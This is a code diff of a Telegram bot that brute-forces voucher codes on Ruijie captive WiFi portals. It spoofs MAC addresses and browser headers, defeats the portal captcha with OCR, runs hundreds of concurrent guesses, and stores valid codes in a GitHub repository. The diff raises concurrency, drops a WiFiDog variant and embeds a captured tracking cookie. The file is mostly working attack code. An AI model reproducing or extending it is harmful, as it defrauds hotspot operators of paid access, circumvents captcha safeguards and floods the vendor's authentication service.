@@ -1,6 +1,6 @@
 import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
 from telebot.async_telebot import AsyncTeleBot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiohttp import web
 import cv2
 import ddddocr
@@ -8,37 +8,45 @@ import numpy as np
 from datetime import datetime, timedelta, timezone
 
 # ── Environment variables ─────────────────────────────────────────────────
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
-ADMIN_ID = os.environ.get("ADMIN_ID", "")
-REPO_OWNER = os.environ.get("REPO_OWNER", "")
-REPO_NAME = os.environ.get("REPO_NAME", "")
-WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "").rstrip("/")
+BOT_TOKEN = ''
+GITHUB_TOKEN = ''
+ADMIN_ID = ""
+REPO_OWNER = ""
+REPO_NAME = ""
 
 # ── Global structures ─────────────────────────────────────────────────────
 SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
 
-user_data = {}
-scan_tasks = {}
-success_texts = {}
-limited_texts = {}
-notify_setting = {}
-last_scan_params = {}
-pending_brute = {}
+user_data = {}              # {chat_id: {"session_url": ...}}
+scan_tasks = {}             # {chat_id: {"task": asyncio.Task, "stop": bool, "scan_id": str}}
+success_texts = {}          # {chat_id: [code, ...]}   – all success codes in current session
+limited_texts = {}          # {chat_id: [code, ...]}   – all limited codes in current session
+captcha_state = {}          # captcha cache per chat_id (used by voucher checks)
+
+# New additions
+notify_setting = {}         # {chat_id: True/False} – notification toggle
+last_scan_params = {}       # {chat_id: {"mode": str, "target": int|None}} – for resume prompt
+pending_brute = {}          # {chat_id: {"mode": str, "target": int|None}} – when resume prompt shown
 
 session = None
 _connector = None
-CONCURRENCY = 200
+CONCURRENCY = 500
 _voucher_sem = None
 _start_time = time.monotonic()
 
-# ── WiFiDog sampled logging counter ──────────────────────────────────────
-_wifidog_counter = {"total": 0, "success": 0, "limit": 0, "err": 0}
-
-# ── Web server ────────────────────────────────────────────────────────────
+# ── Web server (keep alive) ────────────────────────────────────────────────
 async def handle(request):
     return web.Response(text="Bot is awake and running 24/7!")
+
+async def web_server():
+    app = web.Application()
+    app.router.add_get('/', handle)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = int(os.environ.get('BOT_PORT', 5000))
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
 
 # ── GitHub helpers ─────────────────────────────────────────────────────────
 async def get_file_content(path):
@@ -58,7 +66,11 @@ async def update_file_content(path, content, sha, message):
         "Content-Type": "application/json"
     }
     encoded = base64.b64encode(json.dumps(content).encode()).decode()
-    payload = {"message": message, "content": encoded, "sha": sha}
+    payload = {
+        "message": message,
+        "content": encoded,
+        "sha": sha
+    }
     async with session.put(url, headers=headers, json=payload) as response:
         return await response.text()
 
@@ -113,9 +125,16 @@ async def Code_Expires_Date(session_id):
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
         'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
         'content-type': 'application/json;',
         'referer': f'https://portal-as.ruijienetworks.com/download/static/auth/src/balance.html?sessionId={session_id}',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
         'x-requested-with': 'XMLHttpRequest',
     }
     try:
@@ -135,9 +154,10 @@ async def Code_Expires_Date(session_id):
                 totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                 return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
     except Exception as e:
+        print(f"[Code_Expires_Date] error: {e}")
         return "📋 Plan: Unknown | ⏳ Time: Unknown"
 
-# ── Captcha handling ───────────────────────────────────────────────────────
+# ── Captcha handling (per voucher) ─────────────────────────────────────────
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
 def _ocr_sync(image_bytes):
@@ -149,7 +169,8 @@ def _ocr_sync(image_bytes):
     blur = cv2.GaussianBlur(gray, (3, 3), 0)
     _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
     _, buffer = cv2.imencode('.png', thresh)
-    return _ocr.classification(buffer.tobytes()).upper()
+    result = _ocr.classification(buffer.tobytes())
+    return result.upper()
 
 async def Captcha_Text(image_bytes):
     return await asyncio.to_thread(_ocr_sync, image_bytes)
@@ -166,10 +187,19 @@ async def get_session_id(session_obj, session_url, previous_session_id=None):
     mac = get_mac()
     url = replace_mac(session_url, new_mac=mac)
     headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=0, i',
         'referer': url,
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
+        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
+        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
     }
     try:
         async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
@@ -182,9 +212,16 @@ async def get_session_id(session_obj, session_url, previous_session_id=None):
 async def Captcha_Image(session_obj, session_id):
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
-        'accept': 'image/*,*/*;q=0.8',
+        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
         'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'image',
+        'sec-fetch-mode': 'no-cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
     }
     params = {'sessionId': session_id, '_t': str(time.time())}
     async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
@@ -194,40 +231,35 @@ async def Varify_Captcha(session_obj, session_id, text):
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
         'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
         'content-type': 'application/json',
         'origin': 'https://portal-as.ruijienetworks.com',
         'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
     }
     json_data = {'sessionId': session_id, 'authCode': text}
     async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
         data = await req.json()
         return session_id if data.get("success") == True else None
 
-def detect_portal_type(url):
-    if '/api/auth/wifidog' in url or 'wifidog' in url.lower():
-        return "wifidog"
-    if 'maccauth' in url:
-        return "maccauth"
-    return "unknown"
-
 async def check_session_url(session_url):
     try:
         from urllib.parse import urlparse, parse_qs
         parsed = urlparse(session_url)
         params = parse_qs(parsed.query)
-        portal_type = detect_portal_type(session_url)
-        if portal_type == "wifidog":
-            required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
-            return all(k in params for k in required)
-        elif portal_type == "maccauth":
-            return 'sessionId' in session_url or 'maccauth' in session_url
-        return False
+        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
+        return all(k in params for k in required)
     except:
         return False
 
-# ── Maccauth voucher check ─────────────────────────────────────────────
-async def perform_check_maccauth(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
+# ── Core voucher check (used inside brute) ─────────────────────────────
+async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
     global _connector
     if not recheck:
         current_task = scan_tasks.get(chat_id)
@@ -239,7 +271,6 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None, reche
     ).decode()
 
     response = None
-    session_id = None
     for attempt in range(3):
         timeout = aiohttp.ClientTimeout(total=30)
         async with aiohttp.ClientSession(
@@ -252,6 +283,7 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None, reche
             if not session_id:
                 continue
 
+            # Solve captcha
             auth_code = None
             for _ in range(8):
                 try:
@@ -281,13 +313,23 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None, reche
             headers = {
                 "authority": "portal-as.ruijienetworks.com",
                 "accept": "*/*",
+                "accept-language": "en-US,en;q=0.9",
                 "content-type": "application/json",
                 "origin": "https://portal-as.ruijienetworks.com",
-                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
+                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
+                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+                "sec-ch-ua-mobile": "?1",
+                "sec-ch-ua-platform": '"Android"',
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-origin",
+                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
             }
             try:
                 async with task_session.post(post_url, json=data, headers=headers) as req:
                     response = await req.text()
+                    resp_json = json.loads(response)
+                    print(f"[voucher] code={code} attempt={attempt+1} status={req.status} resp={resp_json}")
             except:
                 return
 
@@ -302,13 +344,17 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None, reche
         if recheck:
             return code
 
+        # Add to success list
         if chat_id not in success_texts:
             success_texts[chat_id] = []
+        
+        # Get Plan & Time info
         expire_info = await Code_Expires_Date(session_id)
         success_texts[chat_id].append(f"🎫 {code}\n   {expire_info}")
 
         await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
 
+        # Notification if enabled
         if notify_setting.get(chat_id, False) and message:
             code_line = "\n\n".join(success_texts[chat_id])
             try:
@@ -345,168 +391,7 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None, reche
                 pass
     return None
 
-# ── WiFiDog voucher check ─────────────────────────────────────────────
-async def perform_check_wifidog(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
-    if not recheck:
-        current_task = scan_tasks.get(chat_id)
-        if not current_task or current_task.get("scan_id") != scan_id:
-            return
-
-    def _p(name, default=""):
-        m = re.search(rf'[?&]{name}=([^&]+)', session_url)
-        return m.group(1) if m else default
-
-    gw_id   = _p("gw_id")
-    gw_sn   = _p("gw_sn")
-    gw_addr = _p("gw_address")
-    gw_port = _p("gw_port", "2060")
-    ip      = _p("ip", "0.0.0.0")
-    mac     = _p("mac")
-    nasip   = _p("nasip")
-    ssid    = _p("ssid", "")
-
-    if not gw_id or not mac:
-        return
-
-    _wifidog_counter["total"] += 1
-
-    endpoint = "https://portal-as.ruijienetworks.com/api/auth/wifidog/auth"
-    headers = {
-        "authority":  "portal-as.ruijienetworks.com",
-        "accept":     "*/*",
-        "origin":     "https://portal-as.ruijienetworks.com",
-        "referer":    session_url,
-        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
-    }
-    params = {
-        "stage":      "validate",
-        "gw_id":      gw_id,
-        "gw_sn":      gw_sn,
-        "gw_address": gw_addr,
-        "gw_port":    gw_port,
-        "ip":         ip,
-        "mac":        mac,
-        "nasip":      nasip,
-        "ssid":       ssid,
-        "token":      code,
-        "auth_code":  code,
-    }
-
-    response = None
-    status   = 0
-    err_msg  = ""
-
-    try:
-        async with aiohttp.ClientSession(
-            connector=_connector, connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=aiohttp.ClientTimeout(total=15)
-        ) as ts:
-            async with ts.get(
-                endpoint, params=params, headers=headers,
-                allow_redirects=False
-            ) as req:
-                status   = req.status
-                response = await req.text()
-    except asyncio.TimeoutError:
-        _wifidog_counter["err"] += 1
-        err_msg = "TIMEOUT"
-    except Exception as e:
-        _wifidog_counter["err"] += 1
-        err_msg = str(e)[:60]
-
-    # Sampled log — 100 requests တစ်ခါ
-    if _wifidog_counter["total"] % 100 == 0:
-        print(
-            f"[WiFiDog] checked={_wifidog_counter['total']:,} | "
-            f"success={_wifidog_counter['success']} | "
-            f"limited={_wifidog_counter['limit']} | "
-            f"errors={_wifidog_counter['err']} | "
-            f"last: code={code} status={status} "
-            f"resp={response[:40] if response else err_msg}"
-        )
-
-    if status >= 400:
-        if status == 429:
-            _wifidog_counter["limit"] += 1
-            print(f"⚠️ [WiFiDog] RATE LIMITED! status=429")
-        return
-
-    if not response:
-        return
-
-    if not _wifidog_is_success(response, status):
-        return
-
-    _wifidog_counter["success"] += 1
-    print(f"🎉 [WiFiDog] SUCCESS! code={code} resp={response[:100]}")
-
-    if recheck:
-        return code
-
-    if chat_id not in success_texts:
-        success_texts[chat_id] = []
-    expire_info = "📋 Plan: WiFiDog | ⏳ Time: Unknown"
-    success_texts[chat_id].append(f"🎫 {code}\n   {expire_info}")
-
-    await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
-
-    if notify_setting.get(chat_id, False) and message:
-        code_line = "\n\n".join(success_texts[chat_id])
-        try:
-            if chat_id not in success_messages:
-                sent = await bot.send_message(chat_id, f"✅ Success Codes:\n\n{code_line}")
-                success_messages[chat_id] = sent.message_id
-            else:
-                await bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=success_messages[chat_id],
-                    text=f"✅ Success Codes:\n\n{code_line}"
-                )
-        except:
-            pass
-    return code
-
-
-def _wifidog_is_success(response_text, status_code):
-    if not response_text:
-        return False
-    txt = response_text.strip()
-    success_markers = [
-        "Auth: 1", "auth: 1", "auth:1", "Auth:1",
-        '"success":true', '"success": true',
-        "logonUrl", "login success", "authorized",
-    ]
-    for marker in success_markers:
-        if marker.lower() in txt.lower():
-            return True
-    fail_markers = [
-        "Auth: 0", "auth:0", "invalid", "not found",
-        "expired", "limit", "STA", "error",
-    ]
-    for marker in fail_markers:
-        if marker.lower() in txt.lower():
-            return False
-    if status_code in (301, 302, 303, 307, 308):
-        return True
-    return False
-
-# ── Unified perform_check ─────────────────────────────────────────────
-async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
-    portal_type = user_data.get(chat_id, {}).get('portal_type') or detect_portal_type(session_url)
-
-    if portal_type == "wifidog":
-        return await perform_check_wifidog(
-            session_url, code, chat_id,
-            scan_id=scan_id, recheck=recheck, message=message
-        )
-    else:
-        return await perform_check_maccauth(
-            session_url, code, chat_id,
-            scan_id=scan_id, recheck=recheck, message=message
-        )
-
-# ── Brute-force runner ────────────────────────────────────────────────
+# ── Brute-force runner ─────────────────────────────────────────────────────
 success_messages = {}
 limited_messages = {}
 
@@ -584,21 +469,19 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, messa
                     pass
 
         if progress_msg:
+            finish_text = "✅ Scan completed."
             try:
-                await bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=progress_msg.message_id,
-                    text="✅ Scan completed."
-                )
+                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
             except:
-                pass
+                await bot.send_message(chat_id, finish_text)
         scan_tasks.pop(chat_id, None)
         last_scan_params.pop(chat_id, None)
     finally:
         scan_tasks.pop(chat_id, None)
 
-# ── GitHub update scheduler ────────────────────────────────────────────
+# ── GitHub update scheduler ────────────────────────────────────────────────
 async def github_update_scheduler():
+    global SUCCESS_CODE
     while True:
         await asyncio.sleep(80)
         items = []
@@ -618,7 +501,7 @@ async def github_update_scheduler():
             except Exception as e:
                 print(f"Update Error: {e}")
 
-# ── Bot commands ───────────────────────────────────────────────────────
+# ── Bot commands ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['start'])
 async def start(message):
     await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")
@@ -628,17 +511,16 @@ async def help_cmd(message):
     help_text = (
         "📚 **Command လမ်းညွှန်**\n\n"
         "/setup [session_url] - Session URL သတ်မှတ်ရန်\n"
-        "   WiFiDog + Maccauth URL နှစ်မျိုးလုံး OK\n"
         "/brute <length> [target] - Code စတင်ရှာဖွေရန်\n"
-        "   ဥပမာ /brute 6 10\n"
-        "   /brute 6 (အားလုံးရှာ)\n"
-        "   /brute 8, /brute ascii-lower, /brute all\n"
-        "/stop - ရပ်ရန်\n"
-        "/resume - ပြန်စရန်\n"
-        "/saved - ရှာတွေ့ထားသော codes ကြည့်ရန်\n"
-        "/notify - Notification On/Off\n"
-        "/recheck - Success codes ပြန်စစ်ရန်\n"
-        "/status - (Admin) Bot Status"
+        "   ဥပမာ /brute 6 10  (၆လုံးပါ code ၁၀ ခုတွေ့သည်အထိ)\n"
+        "   /brute 6  (အားလုံးရှာရန်)\n"
+        "   /brute 8 , /brute ascii-lower , /brute all\n"
+        "/stop - ရှာဖွေနေသည့် လုပ်ငန်းစဉ်အားရပ်ရန်\n"
+        "/resume - ရပ်ထားသည့် scan ကို ပြန်စရန်\n"
+        "/saved - ရှာတွေ့ထားသော success/limited codes များကိုကြည့်ရန်\n"
+        "/notify - code တွေ့တိုင်း အကြောင်းကြားချက်ကို On/Off ပြုလုပ်ရန်\n"
+        "/recheck - သိမ်းထားသော success codes များကို ပြန်လည်စစ်ဆေးရန်\n"
+        "/status - (Admin) Bot အခြေအနေကြည့်ရန်"
     )
     await bot.reply_to(message, help_text, parse_mode="Markdown")
 
@@ -653,12 +535,7 @@ async def handle_setup(message):
     if await check_session_url(url):
         user_data[message.chat.id] = user_data.get(message.chat.id, {})
         user_data[message.chat.id]['session_url'] = url
-        user_data[message.chat.id]['portal_type'] = detect_portal_type(url)
-        ptype = "🌐 WiFiDog" if detect_portal_type(url) == "wifidog" else "🔐 Maccauth"
-        await bot.reply_to(
-            message,
-            f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n📡 Type: {ptype}\n\n/brute ဖြင့် စတင်ပါ။"
-        )
+        await bot.reply_to(message, "Session URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
     else:
         await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")
 
@@ -704,7 +581,11 @@ async def start_brute_scan(chat_id, mode, target, original_message):
             scan_id, target, message=original_message, progress_msg=progress_msg
         )
     )
-    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
+    scan_tasks[chat_id] = {
+        "task": task,
+        "stop": False,
+        "scan_id": scan_id
+    }
     success_messages.pop(chat_id, None)
     limited_messages.pop(chat_id, None)
 
@@ -814,90 +695,30 @@ async def status(message):
         f"📊 Bot Status\n\n"
         f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
         f"🔍 Active Scans: {active_scans}\n"
-        f"👥 Sessions Loaded: {len(user_data)}\n"
-        f"🌐 Connection: DIRECT (no proxy)\n"
-        f"📡 WiFiDog hits: {_wifidog_counter['total']:,}"
+        f"👥 Sessions Loaded: {len(user_data)}"
     )
 
-# ── Webhook mode ──────────────────────────────────────────────────────
-async def run_webhook_mode():
-    app = web.Application()
-    webhook_path = f"/webhook/{BOT_TOKEN}"
-
-    async def telegram_webhook(request):
-        try:
-            json_str = await request.text()
-            update = Update.de_json(json_str)
-            await bot.process_new_updates([update])
-        except Exception as e:
-            print(f"[Webhook] error: {e}")
-        return web.Response(text="OK")
-
-    app.router.add_post(webhook_path, telegram_webhook)
-    app.router.add_get('/', handle)
-
-    runner = web.AppRunner(app)
-    await runner.setup()
-    port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8080)))
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
-    print(f"[Webhook] Listening on port {port}")
-
-    full_url = f"{WEBHOOK_URL}{webhook_path}"
-    try:
-        await bot.remove_webhook()
-        await asyncio.sleep(1)
-        await bot.set_webhook(url=full_url, drop_pending_updates=True)
-        print(f"[Webhook] Set: {full_url}")
-    except Exception as e:
-        print(f"[Webhook] Failed: {e}")
-        raise
-
-    asyncio.create_task(github_update_scheduler())
-    await asyncio.Event().wait()
-
-# ── Polling ───────────────────────────────────────────────────────────
+# ── Polling and main ──────────────────────────────────────────────────────
 async def start_polling():
     backoff = 5
     while True:
         try:
             await bot.infinity_polling(timeout=20, request_timeout=20)
             return
-        except telebot.apihelper.ApiTelegramException as e:
-            if e.error_code == 409:
-                print(f"⚠️ 409 Conflict — waiting {backoff}s...")
-                await asyncio.sleep(backoff)
-                backoff = min(backoff * 2, 120)
-                continue
-            print(f"Polling error: {e}. Retry in {backoff}s...")
-            await asyncio.sleep(backoff)
-            backoff = min(backoff * 2, 60)
         except Exception as e:
-            print(f"Polling error: {e}. Retry in {backoff}s...")
+            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
 
-# ── Main ──────────────────────────────────────────────────────────────
 async def main():
     global session, _connector
     timeout = aiohttp.ClientTimeout(total=30)
     _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=False)
     session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
     try:
-        if WEBHOOK_URL:
-            print(f"[Main] WEBHOOK mode ({WEBHOOK_URL})")
-            await run_webhook_mode()
-        else:
-            print("[Main] POLLING mode")
-            app = web.Application()
-            app.router.add_get('/', handle)
-            runner = web.AppRunner(app)
-            await runner.setup()
-            port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8080)))
-            site = web.TCPSite(runner, '0.0.0.0', port)
-            await site.start()
-            asyncio.create_task(github_update_scheduler())
-            await start_polling()
+        asyncio.create_task(web_server())
+        asyncio.create_task(github_update_scheduler())
+        await start_polling()
     finally:
         await session.close()
         await _connector.close()
